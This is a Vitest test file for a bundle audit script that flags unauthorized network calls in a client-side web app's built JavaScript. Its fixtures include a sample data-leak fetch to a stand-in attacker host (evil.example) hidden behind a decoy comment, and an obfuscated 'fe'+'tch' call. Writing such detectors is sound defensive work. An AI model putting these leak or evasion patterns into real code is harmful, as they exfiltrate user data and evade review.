import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import fs from 'fs';
import os from 'os';
import path from 'path';
import { auditFile } from '../scripts/bundle_ast_audit.js';

describe('bundle_ast_audit call-site authorization', () => {
  let dist: string;

  beforeEach(() => {
    dist = fs.mkdtempSync(path.join(os.tmpdir(), 'bundle-audit-'));
    fs.mkdirSync(path.join(dist, 'client', 'assets'), { recursive: true });
  });

  afterEach(() => {
    fs.rmSync(dist, { recursive: true, force: true });
  });

  const audit = (relative: string, code: string) => {
    const file = path.join(dist, relative);
    fs.writeFileSync(file, code);
    return auditFile(file, dist);
  };

  it('rejects fetch to any same-origin API path (QRCraftly has no server API)', () => {
    expect(audit('client/assets/a.js', 'async function r(x){return fetch("/api/redirect/register",{method:"POST",body:x})}')).toHaveLength(1);
    expect(audit('client/assets/b.js', 'function s(i){return fetch(`/api/anything?id=${i}`)}')).toHaveLength(1);
  });

  it('rejects the retired telemetry endpoint', () => {
    expect(audit('client/assets/c.js', 'function t(d){navigator.onLine&&fetch("/api/telemetry/scannability",{method:"POST",body:d})}')).not.toEqual([]);
  });

  it('allows a dynamic fetch only when its own function carries an authorized literal', () => {
    const ok = 'async function w(t){const r=await fetch(t);if(!r.ok)throw new Error("FileReader error");return r}';
    expect(audit('client/assets/d.js', ok)).toEqual([]);
  });

  it('rejects fetch in a chunk where the authorizing text is only a comment', () => {
    const code = '/* sanitizeSvg FileReader error xmlns="http://www.w3.org/2000/svg" */\nfunction leak(p){return fetch("https://evil.example/c?d="+p)}';
    const violations = audit('client/assets/e.js', code);
    expect(violations).toHaveLength(1);
    expect(violations[0].apiName).toBe('fetch');
  });

  it('rejects fetch when the authorized literal lives in a different function of the same chunk', () => {
    const code = 'function a(){throw new Error("FileReader error")}\nfunction leak(u){return fetch(u)}';
    expect(audit('client/assets/f.js', code)).toHaveLength(1);
  });

  it('still rejects WebSocket, XMLHttpRequest and sendBeacon everywhere, including authorized sites', () => {
    const code = 'function w(){new WebSocket("wss://x");new XMLHttpRequest();navigator.sendBeacon("/x","d");throw new Error("FileReader error")}';
    const names = audit('client/assets/h.js', code).map(v => v.apiName).sort();
    expect(names).toEqual(['WebSocket', 'XMLHttpRequest', 'sendBeacon']);
  });

  it('allows fetch in the generated service worker by its fixed path only', () => {
    const sw = 'self.addEventListener("fetch",e=>{e.respondWith(caches.match(e.request).then(r=>r||fetch(e.request)))});';
    expect(audit('client/sw.js', sw)).toEqual([]);
    expect(audit('client/assets/sw.js', sw).length).toBeGreaterThan(0);
  });

  it('flags obfuscated element access to fetch', () => {
    expect(audit('client/assets/i.js', 'function o(u){return window["fe"+"tch"](u)}').length).toBeGreaterThan(0);
  });
});
